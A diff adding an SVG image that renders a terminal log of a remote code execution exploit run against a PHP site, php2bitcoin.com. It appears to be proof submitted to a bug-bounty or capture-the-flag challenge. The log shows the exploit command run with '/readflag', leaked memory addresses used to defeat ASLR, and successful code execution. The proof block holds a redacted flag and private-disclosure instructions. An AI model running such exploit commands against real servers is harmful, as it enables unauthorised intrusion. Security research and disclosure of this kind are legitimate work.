@@ -1,0 +1,37 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 540" font-family="ui-monospace,SFMono-Regular,Menlo,Consolas,monospace">
+  <rect width="900" height="540" rx="12" fill="#0d1117"/>
+  <!-- window chrome -->
+  <rect x="0" y="0" width="900" height="38" rx="12" fill="#161b22"/>
+  <rect x="0" y="20" width="900" height="18" fill="#161b22"/>
+  <circle cx="24" cy="19" r="6" fill="#f85149"/>
+  <circle cx="44" cy="19" r="6" fill="#d29922"/>
+  <circle cx="64" cy="19" r="6" fill="#2ea043"/>
+  <text x="450" y="24" fill="#7d8590" font-size="12" text-anchor="middle">win-flag-proof.log  ·  2026-10-30 07:14:35 UTC</text>
+
+  <g font-size="13">
+    <text x="20" y="68" fill="#7d8590">$ python3 poc/p2b_rce.py -u https://php2bitcoin.com/index.php \</text>
+    <text x="20" y="86" fill="#7d8590">      -c '/readflag; echo zZ9DONEzZ9' --huge 10 --ht-spray 16 --ncarr 96</text>
+
+    <text x="20" y="116" fill="#adbac7">[*] STAGE 1-2  in-band ASLR bypass (Set-Cookie leak)</text>
+    <text x="20" y="136" fill="#56d364">[+] chunk base (Zend MM) = 0x7f8c45000000</text>
+    <text x="20" y="156" fill="#56d364">[+] libphp base          = 0x7f8c46c00000</text>
+    <text x="20" y="176" fill="#56d364">[+] ASLR defeated in-band (HTTP only)</text>
+    <text x="20" y="200" fill="#adbac7">[*] STAGE 3  reclaim  zif_system=0x7f8c471996e0  HT=0x7f8c4507e0d8</text>
+    <text x="20" y="220" fill="#7d8590">    attempt 1: reclaim_post 0.6s  fired (blind)</text>
+    <text x="20" y="238" fill="#7d8590">    attempt 2: reclaim_post 0.6s  fired (blind)</text>
+    <text x="20" y="256" fill="#7d8590">    attempt 3: reclaim_post 0.6s  fired (blind)</text>
+    <text x="20" y="274" fill="#7d8590">    attempt 4: reclaim_post 0.8s  fired (blind)</text>
+    <text x="20" y="292" fill="#ffa657">[+] code execution on attempt 5 (reclaim 0.6s)</text>
+  </g>
+
+  <!-- proof block -->
+  <rect x="20" y="308" width="860" height="206" rx="8" fill="#12261a" stroke="#238636"/>
+  <text x="36" y="332" fill="#7d8590" font-size="12">---- PROOF (chunked HTTP response body) ----</text>
+  <text x="36" y="356" fill="#7d8590" font-size="12">Transfer-Encoding: chunked</text>
+  <text x="36" y="384" fill="#56d364" font-size="15" font-weight="700">CODEWALL{php2bitcoin_REDACTED}</text>
+  <text x="36" y="412" fill="#adbac7" font-size="12">You have code execution. Email this flag, the target name and a short</text>
+  <text x="36" y="430" fill="#adbac7" font-size="12">write-up of how you got in to paul@codewall.ai to claim the bounty.</text>
+  <text x="36" y="448" fill="#adbac7" font-size="12">Keep the details private until we have confirmed and fixed the issue.</text>
+  <text x="36" y="476" fill="#79c0ff" font-size="12">zZ9DONEzZ9   ← per-run nonce, appears exactly once → live output, not a replay</text>
+  <text x="36" y="502" fill="#7d8590" font-size="12">no crash · /api/v1/state worker_replacements &amp; server_errors unchanged</text>
+</svg>
